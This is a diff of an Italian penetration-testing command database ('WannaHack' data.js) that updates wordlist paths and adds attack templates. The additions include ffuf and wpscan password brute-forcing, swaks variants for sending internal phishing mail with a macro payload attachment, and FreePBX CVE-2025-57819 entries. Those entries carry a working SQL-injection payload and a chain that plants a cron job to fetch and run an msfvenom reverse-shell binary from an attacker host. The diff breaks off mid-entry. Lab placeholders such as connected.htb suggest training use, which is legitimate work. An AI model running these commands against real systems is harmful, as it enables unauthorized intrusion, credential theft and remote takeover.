@@ -1,4 +1,4 @@
-/* data.js — generato da WannaHack il 2026-11-09T14:20:02.415Z */
+/* data.js — generato da WannaHack il 2026-11-19T08:54:52.355Z */
 const COMMANDS = [
   {
     "id": "whois-domain",
@@ -1842,7 +1842,7 @@ const COMMANDS = [
       "subdomains",
       "bruteforce"
     ],
-    "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
+    "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
     "params": [
       {
         "key": "domain",
@@ -1866,13 +1866,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "dnsenum",
-        "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
+        "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
         "description": "Bruteforce + AXFR + whois in un tool solo. È `-f` ad attivare il bruteforce: senza wordlist dnsenum si limita a enumerare i record. `--dnsserver` manda le query al DNS indicato, obbligatorio sui domini interni che il resolver locale non risolve."
       },
       {
         "id": "puredns",
         "label": "puredns",
-        "template": "puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain> --resolvers resolvers.txt",
+        "template": "puredns bruteforce /usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt <domain> --resolvers resolvers.txt",
         "description": "Bruteforce ad alta velocità con resolver multipli: gestisce wordlist enormi."
       },
       {
@@ -1897,6 +1897,48 @@ const COMMANDS = [
     "note": "# Prossimo passo\nPer trovarne altri, genera varianti dai sottodomini già noti e risolvile in massa."
   },
   {
+    "id": "curl-vhost-baseline",
+    "name": "curl — baseline vhost (Content-Length)",
+    "category": "info-gathering",
+    "subcategory": "active-recon",
+    "group": "Virtual Hosts",
+    "description": "Misura la dimensione della risposta del server per un virtual host inesistente. Quel numero diventa il valore di filtro nel fuzzing dei vhost, così da scartare le risposte di default ed eliminare i falsi positivi.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "curl",
+      "vhost",
+      "web"
+    ],
+    "template": "# baseline: misura la risposta per un vhost inesistente → è il valore da filtrare nel fuzzing\ncurl -s -I http://<ip> -H \"Host: nonexistent.<domain>\" | grep -i \"Content-Length:\"\n\n# su HTTPS aggiungi -k per ignorare il certificato che non combacia (risolve curl: (60))\ncurl -sk -I https://<ip> -H \"Host: nonexistent.<domain>\" | grep -i \"Content-Length:\"",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "inlanefreight.local"
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — Web pentesting",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
+      }
+    ],
+    "note": "# Prossimo passo\nUsa il numero come `<fsize>` in ffuf (`-fs`) o come `<len>` in gobuster (`--exclude-length`).\n# Suggerimento\nIl nome dentro il certificato HTTPS (es. `curl: (60) ... 'pbxconnect'`) è spesso a sua volta un vhost da provare."
+  },
+  {
     "id": "ffuf-vhost",
     "name": "ffuf — vhost (Host header)",
     "category": "info-gathering",
@@ -1915,7 +1957,7 @@ const COMMANDS = [
       "vhost",
       "web"
     ],
-    "template": "ffuf -u http://<ip> -H \"Host: FUZZ.<domain>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <fsize>",
+    "template": "ffuf -u http://<ip> -H \"Host: FUZZ.<domain>\" -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt -fs <fsize>",
     "params": [
       {
         "key": "ip",
@@ -1972,7 +2014,7 @@ const COMMANDS = [
       {
         "key": "wordlist",
         "label": "Wordlist",
-        "placeholder": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+        "placeholder": "/usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt"
       },
       {
         "key": "len",
@@ -2007,7 +2049,7 @@ const COMMANDS = [
       "fuzzing",
       "web"
     ],
-    "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
+    "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o ffuf.json -of json",
     "params": [
       {
         "key": "ip",
@@ -2025,25 +2067,25 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Media",
-        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
+        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o ffuf.json -of json",
         "description": "Wordlist media: buon equilibrio copertura/tempo."
       },
       {
         "id": "ext",
         "label": "Con estensioni",
-        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt,.bak,.conf,.xml,.aspx,.jsp",
+        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.html,.txt,.bak,.conf,.xml,.aspx,.jsp",
         "description": "Aggiunge estensioni comuni: trova file (config, backup) oltre alle directory."
       },
       {
         "id": "recursion",
         "label": "Ricorsivo",
-        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 2",
+        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -recursion -recursion-depth 2",
         "description": "Scende nelle directory trovate (profondità 2). Wordlist piccola per non esplodere."
       },
       {
         "id": "path",
         "label": "Sotto un path",
-        "template": "ffuf -u http://<ip>/<path>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
+        "template": "ffuf -u http://<ip>/<path>/FUZZ -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt",
         "description": "Fuzz dentro un path già scoperto (es. `/admin/FUZZ`)."
       }
     ],
@@ -2060,12 +2102,85 @@ const COMMANDS = [
     "note": "# Opzioni\n- `-fc` filtra per codice di risposta, per esempio per nascondere i 404\n- `-fs` filtra per dimensione della risposta\n- le estensioni da cercare come `.php` o `.aspx` si scelgono in base alla tecnologia del sito\n# Prossimo passo\nVisita e analizza i percorsi trovati; se rispondono solo con un host specifico, passa al fuzzing dei virtual host."
   },
   {
+    "id": "ffuf-fuzz",
+    "name": "ffuf — parametri, POST, header",
+    "category": "info-gathering",
+    "subcategory": "active-recon",
+    "group": "Parameter Fuzzing",
+    "description": "Usa la parola chiave FUZZ ovunque nella richiesta, non solo nel path: scopre parametri GET nascosti, forza i campi di un form POST e sonda header come `Host` o `X-Forwarded-For`. Lo stesso motore di ffuf serve così alla scoperta di parametri, al brute dei login e ai bypass basati su header, cioè i vettori che gli scanner automatici spesso non vedono.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "ffuf",
+      "fuzzing",
+      "parametri",
+      "web"
+    ],
+    "template": "ffuf -u \"http://<ip>/?FUZZ=1\" -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/burp-parameter-names.txt -ac",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "getparam",
+        "label": "Parametri GET",
+        "template": "ffuf -u \"http://<ip>/?FUZZ=1\" -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/burp-parameter-names.txt -ac",
+        "description": "Scopre parametri GET nascosti provando nomi comuni; `-ac` calibra da solo i filtri sulle risposte di base."
+      },
+      {
+        "id": "postlogin",
+        "label": "Form POST / login",
+        "template": "ffuf -u http://<ip>/login -X POST -d \"username=admin&password=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -w /usr/share/wordlists/rockyou.txt -fc 200",
+        "description": "Forza la password di un form di login inviando i dati in POST e filtrando la risposta del tentativo fallito."
+      },
+      {
+        "id": "postparam",
+        "label": "Parametri POST",
+        "template": "ffuf -u http://<ip>/api -X POST -d \"FUZZ=1\" -H \"Content-Type: application/x-www-form-urlencoded\" -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/burp-parameter-names.txt -ac",
+        "description": "Come la scoperta GET ma sul corpo POST, per le API e gli endpoint che accettano solo quel metodo."
+      },
+      {
+        "id": "header",
+        "label": "Header (Host / IP spoof)",
+        "template": "ffuf -u http://<ip>/ -H \"X-Forwarded-For: FUZZ\" -w ips.txt -ac",
+        "description": "Fuzza il valore di un header: utile per aggirare restrizioni basate su IP con `X-Forwarded-For` o per il routing per `Host`."
+      },
+      {
+        "id": "clusterbomb",
+        "label": "Due liste (clusterbomb)",
+        "template": "ffuf -u http://<ip>/login -X POST -d \"username=W1&password=W2\" -w users.txt:W1 -w /usr/share/wordlists/rockyou.txt:W2 -mode clusterbomb -fc 200",
+        "description": "Combina due wordlist con parole chiave distinte `W1` e `W2`: in modalità clusterbomb prova ogni utente contro ogni password."
+      }
+    ],
+    "refs": [
+      {
+        "label": "ffuf — wiki",
+        "url": "https://github.com/ffuf/ffuf/wiki"
+      },
+      {
+        "label": "SecLists",
+        "url": "https://github.com/danielmiessler/SecLists"
+      }
+    ],
+    "note": "# Filtrare il rumore\nIl segreto del fuzzing di parametri è distinguere la risposta normale da quella interessante. `-ac` calibra i filtri da solo; in alternativa filtri a mano per codice `-fc`, dimensione `-fs`, parole `-fw`, righe `-fl` o regex `-fr`, oppure al contrario includi con i corrispettivi `-mc`, `-ms`, `-mw`.\n# Più wordlist insieme\nCon più `-w` e parole chiave distinte scegli come combinarle: `clusterbomb` prova tutte le combinazioni possibili, `pitchfork` accoppia le liste riga per riga.\n# Prossimo passo\nUn parametro nascosto appena trovato va subito testato per SQLi, LFI, SSRF e command injection: è spesso l’ingresso che gli strumenti automatici non raggiungono."
+  },
+  {
     "id": "gobuster-dir",
     "name": "gobuster — directory",
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Directory Fuzzing",
-    "description": "Alternativa a ffuf per la ricerca di file e directory. Comoda per confrontare i risultati quando ffuf produce falsi positivi.",
+    "description": "Alternativa a ffuf per la ricerca di file e directory nascoste. Veloce e stabile, comoda per confrontare i risultati quando ffuf produce falsi positivi o per avere una seconda lettura della superficie web.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -2078,7 +2193,7 @@ const COMMANDS = [
       "fuzzing",
       "web"
     ],
-    "template": "gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -o gobuster.txt",
+    "template": "gobuster dir -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -o gobuster.txt",
     "params": [
       {
         "key": "ip",
@@ -2087,13 +2202,45 @@ const COMMANDS = [
         "placeholder": "10.10.10.11"
       }
     ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Base",
+        "template": "gobuster dir -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -o gobuster.txt",
+        "description": "Fuzzing di directory con cinquanta processi paralleli e salvataggio su file."
+      },
+      {
+        "id": "ext",
+        "label": "Con estensioni",
+        "template": "gobuster dir -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,bak,conf -t 50",
+        "description": "Cerca anche i file con le estensioni indicate, scelte in base alla tecnologia del sito."
+      },
+      {
+        "id": "auth",
+        "label": "Cookie / header",
+        "template": "gobuster dir -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c \"PHPSESSID=...\" -H \"Authorization: Bearer ...\"",
+        "description": "Fuzza dietro un’autenticazione, passando il cookie di sessione o un header di autorizzazione."
+      },
+      {
+        "id": "filter",
+        "label": "Filtri stato/dimensione",
+        "template": "gobuster dir -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -b 404,403 --exclude-length 0",
+        "description": "Nasconde gli stati indicati e le risposte di una certa lunghezza, per ripulire l’output quando il sito risponde sempre 200."
+      },
+      {
+        "id": "https",
+        "label": "HTTPS (no TLS check)",
+        "template": "gobuster dir -u https://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -k -t 50",
+        "description": "Sui servizi TLS con certificato non valido, `-k` salta la verifica del certificato."
+      }
+    ],
     "refs": [
       {
-        "label": "gobuster — GitHub",
+        "label": "gobuster — README",
         "url": "https://github.com/OJ/gobuster"
       }
     ],
-    "note": "# Opzioni\n- `-t` numero di processi paralleli\n- `-x` estensioni da cercare, per esempio `php,html,txt,bak`"
+    "note": "# Opzioni\n`-t` regola i processi paralleli, `-x` le estensioni da cercare come `php,html,bak`, `-k` ignora il TLS non valido e `-r` segue i redirect. `-b` è la blacklist degli stati (default `404`), `-s` al contrario ne mostra solo alcuni.\n# Altre modalità\n`gobuster` non fa solo directory: `vhost` scopre i virtual host, `dns` enumera i sottodomini, `s3` e `gcs` sondano i bucket cloud, `fuzz` sostituisce la parola chiave `FUZZ` in URL, header e corpo."
   },
   {
     "id": "feroxbuster",
@@ -2114,7 +2261,7 @@ const COMMANDS = [
       "fuzzing",
       "web"
     ],
-    "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+    "template": "feroxbuster -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt",
     "params": [
       {
         "key": "ip",
@@ -2127,25 +2274,25 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Base (ricorsivo)",
-        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt",
         "description": "Ricorsivo di default: scende da solo nelle directory trovate."
       },
       {
         "id": "ext",
         "label": "Con estensioni",
-        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,conf",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,bak,conf",
         "description": "Aggiunge le estensioni ai nomi provati (senza punto, separate da virgola)."
       },
       {
         "id": "force",
         "label": "Forza 403",
-        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --force-recursion",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --force-recursion",
         "description": "Ricorre su TUTTI gli endpoint trovati, 403 compresi (di default un 403 viene seguito solo col `/` finale). Rispetta `-d` (default 4)."
       },
       {
         "id": "norecurse",
         "label": "Senza ricorsione",
-        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -n",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/wordlists-custom/SecLists-2026.1/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -n",
         "description": "Un solo livello, come un dirbuster classico."
       }
     ],
@@ -2862,7 +3009,7 @@ const COMMANDS = [
       {
         "key": "userlist",
         "label": "Userlist",
-        "placeholder": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
+        "placeholder": "/usr/share/wordlists-custom/SecLists-2026.1/Usernames/xato-net-10-million-usernames.txt"
       },
       {
         "key": "ip",
@@ -2933,7 +3080,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "smtp",
     "group": "Open Relay",
-    "description": "Invia una email di prova attraverso il server. Serve a verificare se è un open relay e a innescare le email di verifica di alcune applicazioni.",
+    "description": "Invia email di prova attraverso un server SMTP. Serve a confermare un open relay, a validare credenziali con l’invio autenticato e a recapitare messaggi con allegato per il phishing interno.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -2949,16 +3096,28 @@ const COMMANDS = [
     "template": "swaks --to user@<domain> --from test@test.com --server <ip> --body \"test\"",
     "params": [
       {
-        "key": "domain",
-        "label": "Domain",
-        "ctx": "domain",
-        "placeholder": "corp.local"
-      },
-      {
         "key": "ip",
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "domain",
+        "label": "Dominio",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      },
+      {
+        "key": "user",
+        "label": "Utente",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "••••••"
       }
     ],
     "refs": [
@@ -2967,7 +3126,27 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html"
       }
     ],
-    "note": "# Output atteso\nSe l'email raggiunge un dominio esterno che il server non gestisce, l'open relay e confermato: può essere sfruttato per spam o per falsificare il mittente."
+    "note": "# Output atteso\nSe la mail raggiunge un dominio esterno che il server non gestisce, l’open relay è confermato: si presta a spam e a falsificare il mittente.\n# Invio autenticato\n`--auth` supporta LOGIN, PLAIN e CRAM-MD5. Molti server accettano l’invio solo dopo `STARTTLS`, che si forza con `-tls`. Un invio autenticato riuscito conferma la coppia utente e password sul servizio di posta.",
+    "variants": [
+      {
+        "id": "default",
+        "label": "Open relay",
+        "template": "swaks --to user@<domain> --from test@test.com --server <ip> --body \"test\"",
+        "description": "Invia una mail verso un dominio esterno attraverso il server: se viene recapitata, l’open relay è confermato e sfruttabile per spam o spoofing del mittente."
+      },
+      {
+        "id": "auth",
+        "label": "Invio autenticato",
+        "template": "swaks --to victim@<domain> --from attacker@<domain> --server <ip> --auth LOGIN --auth-user <user> --auth-password <password> --body \"test\"",
+        "description": "Invia una mail autenticandosi con credenziali valide, utile sia per confermarle sia per recapitare messaggi interni credibili."
+      },
+      {
+        "id": "attach",
+        "label": "Con allegato (phishing)",
+        "template": "swaks --to victim@<domain> --from hr@<domain> --server <ip> --header \"Subject: Report\" --body \"In allegato il report.\" --attach @payload.doc",
+        "description": "Allega un file al messaggio, la base del phishing interno con un documento con macro o un collegamento malevolo."
+      }
+    ]
   },
   {
     "id": "dns-query",
@@ -3107,7 +3286,7 @@ const COMMANDS = [
       "dns",
       "brute"
     ],
-    "template": "dnsenum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
+    "template": "dnsenum --dnsserver <ip> -f /usr/share/wordlists-custom/SecLists-2026.1/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
     "params": [
       {
         "key": "ip",
@@ -3191,8 +3370,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "web-apps",
     "group": "CMS",
-    "description": "Scanner WordPress: enumera plugin, temi e utenti e, con `--api-token`, mostra i CVE noti. In modalità brute force `-U` e `-P` agiscono contro `wp-login`.",
-    "note": "# Credenziali di default\nWordPress non ha un default fisso, ma dopo aver enumerato gli utenti prova `admin:admin` · `admin:password` · utente uguale alla password. Poi brute mirato con `--usernames`/`--passwords`.",
+    "description": "Scanner dedicato a WordPress: riconosce la versione del core, enumera plugin, temi e utenti e, con un API token, collega ogni componente ai CVE noti. Enumerare i plugin vulnerabili è spesso la via più rapida alla RCE, perché il core aggiornato regge ma i plugin di terze parti no.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -3224,13 +3402,31 @@ const COMMANDS = [
         "id": "default",
         "label": "Enumera",
         "template": "wpscan --url http://<ip> --enumerate ap,at,u --api-token <token>",
-        "description": "Enumera tutti i plugin (ap), temi (at) e utenti (u)."
+        "description": "Enumera tutti i plugin (`ap`), i temi (`at`) e gli utenti (`u`)."
+      },
+      {
+        "id": "vuln",
+        "label": "Solo vulnerabili",
+        "template": "wpscan --url http://<ip> --enumerate vp,vt --api-token <token>",
+        "description": "Si concentra sui soli plugin e temi vulnerabili, andando dritto ai componenti sfruttabili."
+      },
+      {
+        "id": "aggressive",
+        "label": "Plugin aggressivo",
+        "template": "wpscan --url http://<ip> --enumerate ap --plugins-detection aggressive --api-token <token>",
+        "description": "Controlla migliaia di percorsi noti invece di fidarsi della sola pagina, scoprendo plugin nascosti al prezzo di molte più richieste."
       },
       {
         "id": "brute",
         "label": "Brute login",
-        "template": "wpscan --url http://<ip> -U users.txt -P /usr/share/wordlists/rockyou.txt",
-        "description": "Bruteforce delle password via `XML-RPC`/`wp-login` con la lista utenti trovata."
+        "template": "wpscan --url http://<ip> -U users.txt -P /usr/share/wordlists/rockyou.txt --password-attack wp-login",
+        "description": "Forza le password contro `wp-login` con la lista di utenti già enumerata."
+      },
+      {
+        "id": "stealth",
+        "label": "Stealth",
+        "template": "wpscan --url http://<ip> --stealthy --enumerate u,vp --api-token <token>",
+        "description": "Alias che attiva lo User-Agent casuale e il rilevamento passivo, per restare discreti."
       }
     ],
     "refs": [
@@ -3238,7 +3434,8 @@ const COMMANDS = [
         "label": "HackTricks — WordPress",
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html"
       }
-    ]
+    ],
+    "note": "# Token e limiti\nIl token gratuito della WPScan API sblocca i dati di vulnerabilità ma ha un tetto giornaliero di richieste. Senza token enumeri comunque componenti e utenti, ma perdi il collegamento ai CVE.\n# Credenziali di default\nWordPress non ha una coppia predefinita. Dopo aver enumerato gli utenti prova `admin:admin`, `admin:password` e utente uguale alla password, poi passa al brute mirato con `-U` e `-P`.\n# Rilevamento aggressivo\nIl rilevamento passivo trova solo i plugin citati nella pagina. `--plugins-detection aggressive` ne scopre molti di più sondando i percorsi noti, indispensabile quando il plugin vulnerabile non è referenziato nell’HTML."
   },
   {
     "id": "droopescan",
@@ -4168,6 +4365,207 @@ const COMMANDS = [
         "url": "https://liferay.dev/portal/security/known-vulnerabilities"
       }
     ]
+  },
+  {
+    "id": "freepbx-sqli-rce",
+    "name": "FreePBX — SQLi pre-auth (CVE-2025-57819)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "FreePBX (Asterisk)",
+    "description": "FreePBX è l’interfaccia web PHP di Sangoma che gestisce il centralino VoIP Asterisk, con l’Admin Control Panel spesso esposto su 80/443. \n\n**CVE-2025-57819** è una SQL injection **non autenticata** nel modulo **Endpoint Manager** (`admin/ajax.php`, parametro `brand`): il valore non sanitizzato finisce dritto nelle query SQL sul database `asterisk`. Questo comando **conferma** l’iniezione; l’esecuzione di codice è nei due comandi dedicati, uno per PoC: **FreePBX — RCE** (Jeanback1, codice come `asterisk`) e **FreePBX — RCE to root** (ozcanpng, catena fino a root via incron).",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "freepbx",
+      "voip",
+      "asterisk",
+      "cve-2025-57819",
+      "sqli",
+      "rce"
+    ],
+    "template": "# Verifica manuale tramite la PoC error-based non-auth: \n# errore XPATH con ~USER:...~ → target vulnerabile\ncurl -i -k \"https://<ip>/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+\"\n\n# Dopo la verifica automatizziamo con sqlmap: \n# solo error-based (-E) su MySQL/MariaDB \n# * è il punto di injection\nsqlmap \"https://<ip>/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x*\" --batch --dbms=mysql --technique=E",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "connected.htb"
+      }
+    ],
+    "refs": [
+      {
+        "label": "FreePBX — advisory GHSA-m42g-xg4c-5f3h",
+        "url": "https://github.com/freepbx/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h"
+      },
+      {
+        "label": "PoC — MuhammadWaseem29 (il comando)",
+        "url": "https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819"
+      },
+      {
+        "label": "Greenbone — analisi CVE-2025-57819",
+        "url": "https://www.greenbone.net/en/blog/cve-2025-57819-unauthenticated-rce-threatens-freepbx-systems-globally/"
+      }
+    ],
+    "note": "# Versioni vulnerabili\n- **FreePBX 15, 16 e 17** con il modulo **Endpoint Manager** installato e l’Admin Control Panel esposto su 80/443\n- Corretta nel modulo endpoint: **15.0.66**, **16.0.89**, **17.0.3**\n# Dalla verifica alla RCE\nL’errore XPATH (`~USER:freepbxuser@localhost~`) conferma l’iniezione e già rivela l’utente del DB. Con `sqlmap` puoi dumpare hash e credenziali admin. Per l’esecuzione di codice usa i due comandi dedicati (uno per PoC): **FreePBX — RCE** (Jeanback1 `cve_2025_57819_aio.py`: reverse shell `msfvenom`/`--payload` o creazione admin) e **FreePBX — RCE to root** (ozcanpng: SQLi → webshell → incron `fwconsole` → root shell)."
+  },
+  {
+    "id": "freepbx-rce",
+    "name": "FreePBX — RCE (CVE-2025-57819)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "FreePBX (Asterisk)",
+    "description": "E' una PoC all-in-one in cui tutte le varianti partono dalla **stessa SQLi pre-auth** (`admin/ajax.php`, parametro `brand`), che inietta `INSERT` arbitrarie nel database `asterisk`: cambia solo cosa si scrive e come arriva l’esecuzione.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "freepbx",
+      "voip",
+      "asterisk",
+      "cve-2025-57819",
+      "sqli",
+      "rce"
+    ],
+    "template": "# scarica il PoC all-in-one (CVE-2025-57819)\ngit clone https://github.com/Jeanback1/CVE-2025-57819-exploit\ncd CVE-2025-57819-exploit\n\n# genera il binario ELF con msfvenom, avvia lo stage HTTP (porta lport+1), inietta il cron via SQLi e mette in ascolto la reverse shell\npython3 cve_2025_57819_aio.py http://<ip> <lhost> <lport>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "connected.htb"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      },
+      {
+        "key": "payload",
+        "label": "Payload ELF",
+        "placeholder": "/tmp/shell.elf"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "reverse shell (msfvenom)",
+        "template": "# scarica il PoC all-in-one (CVE-2025-57819)\ngit clone https://github.com/Jeanback1/CVE-2025-57819-exploit\ncd CVE-2025-57819-exploit\n\n# genera il binario ELF con msfvenom, avvia lo stage HTTP (porta lport+1), inietta il cron via SQLi e mette in ascolto la reverse shell\npython3 cve_2025_57819_aio.py http://<ip> <lhost> <lport>",
+        "description": "Scrive un **cron job** in `cron_jobs` con `schedule='* * * * *'`: entro ~60s il cron di Asterisk lo esegue **come utente `asterisk`**. Lo script genera l’ELF (`msfvenom`, `linux/x64/shell_reverse_tcp`), lo serve via HTTP sulla porta `lport+1`; il cron fa `curl`+`chmod +x`+`exec` e la reverse shell torna su `lport`. All’uscita rimuove il job.\n<pre>HTTP non autenticata<br>    │<br>    ▼<br>GET /admin/ajax.php · param «brand» = SQLi<br>    │<br>    ▼<br>INSERT INTO cron_jobs   schedule = * * * * *<br>    │<br>    ▼<br>~60s → il cron esegue come utente «asterisk»<br>    │   curl lhost:lport+1/x.elf → chmod +x → exec<br>    ▼<br>reverse shell → lhost:lport   ==   RCE<br>    │<br>    ▼<br>cleanup: DELETE FROM cron_jobs</pre>"
+      },
+      {
+        "id": "payload",
+        "label": "reverse shell (--payload)",
+        "template": "# scarica il PoC all-in-one (CVE-2025-57819)\ngit clone https://github.com/Jeanback1/CVE-2025-57819-exploit\ncd CVE-2025-57819-exploit\n\n# usa un TUO ELF al posto di msfvenom: stage HTTP, cron via SQLi, listener\npython3 cve_2025_57819_aio.py http://<ip> <lhost> <lport> --payload <payload>",
+        "description": "Stessa catena, ma invece di generare l’ELF con msfvenom carichi il **tuo binario** con `--payload <percorso>`. Utile quando msfvenom non c’è o vuoi un payload specifico."
+      },
+      {
+        "id": "admin",
+        "label": "creazione admin",
